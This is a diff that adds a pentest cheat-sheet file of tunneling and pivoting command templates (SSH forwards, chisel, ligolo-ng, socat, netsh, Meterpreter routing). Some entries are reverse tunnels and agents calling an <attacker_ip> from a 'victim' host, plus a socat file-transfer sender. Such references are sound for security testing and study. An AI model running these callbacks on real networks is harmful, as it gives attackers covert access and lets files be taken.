@@ -1,0 +1,114 @@
+% tunnels, ssh, pivoting, portforward, proxy
+
+# SSH local port forward
+ssh -L <local_port>:<target_host>:<target_port> <user>@<jump_host>
+
+# SSH remote port forward
+ssh -R <remote_port>:<local_host>:<local_port> <user>@<remote_host>
+
+# SSH dynamic SOCKS proxy
+ssh -D <socks_port> <user>@<host>
+
+# SSH with ProxyJump (bastion)
+ssh -J <user>@<jump_host> <user>@<target_host>
+
+# SSH tunnel background
+ssh -fN -L <local_port>:<target_host>:<target_port> <user>@<jump_host>
+
+# SSH reverse tunnel (callback)
+ssh -fN -R <remote_port>:localhost:22 <user>@<attacker_host>
+
+# Chisel server (on attacker)
+chisel server -p <port> --reverse
+
+# Chisel client reverse SOCKS
+chisel client <attacker_ip>:<port> R:socks
+
+# Chisel client port forward
+chisel client <attacker_ip>:<port> R:<remote_port>:<target_host>:<target_port>
+
+# Chisel client local forward
+chisel client <server_ip>:<port> <local_port>:<target_host>:<target_port>
+
+# Ligolo-ng proxy (attacker)
+./proxy -selfcert
+
+# Ligolo-ng agent (victim)
+./agent -connect <attacker_ip>:11601 -ignore-cert
+
+# Socat port forward
+socat TCP-LISTEN:<local_port>,fork TCP:<target_host>:<target_port>
+
+# Socat file transfer
+# Receiver:
+socat TCP-LISTEN:<port>,fork file:<output_file>,create
+# Sender:
+socat TCP:<target>:<port> file:<input_file>
+
+# Netcat relay
+nc -lvp <port1> | nc <target> <port2>
+
+# Proxychains with nmap
+proxychains nmap -sT -Pn <target>
+
+# Proxychains any command
+proxychains <command>
+
+# Edit proxychains config
+# /etc/proxychains4.conf
+# socks5 127.0.0.1 1080
+
+# WireGuard - generate keys
+wg genkey | tee privatekey | wg pubkey > publickey
+
+# WireGuard - quick up
+wg-quick up <interface>
+
+# WireGuard - quick down
+wg-quick down <interface>
+
+# WireGuard - show status
+wg show
+
+# sshuttle - VPN over SSH
+sshuttle -r <user>@<host> <network_cidr>
+
+# sshuttle - all traffic
+sshuttle -r <user>@<host> 0/0
+
+# Metasploit portfwd
+# portfwd add -l <local> -p <remote_port> -r <target>
+
+# Meterpreter autoroute
+# run autoroute -s <subnet>
+
+# plink (Windows SSH)
+plink.exe -L <local_port>:<target>:<target_port> <user>@<host>
+
+# netsh port forward (Windows)
+netsh interface portproxy add v4tov4 listenport=<local_port> listenaddress=0.0.0.0 connectport=<target_port> connectaddress=<target_host>
+
+# netsh show forwards
+netsh interface portproxy show all
+
+# netsh delete forward
+netsh interface portproxy delete v4tov4 listenport=<local_port> listenaddress=0.0.0.0
+
+$ local_port: echo "8080"
+$ target_host: echo ""
+$ target_port: echo "80"
+$ user: echo ""
+$ jump_host: echo ""
+$ remote_host: echo ""
+$ remote_port: echo "9999"
+$ local_host: echo "127.0.0.1"
+$ socks_port: echo "1080"
+$ host: echo ""
+$ attacker_ip: echo ""
+$ attacker_host: echo ""
+$ port: echo "8080"
+$ server_ip: echo ""
+$ network_cidr: echo "10.0.0.0/24"
+$ interface: echo "wg0"
+$ output_file: echo "received_file"
+$ input_file: find . -type f 2>/dev/null | head -5
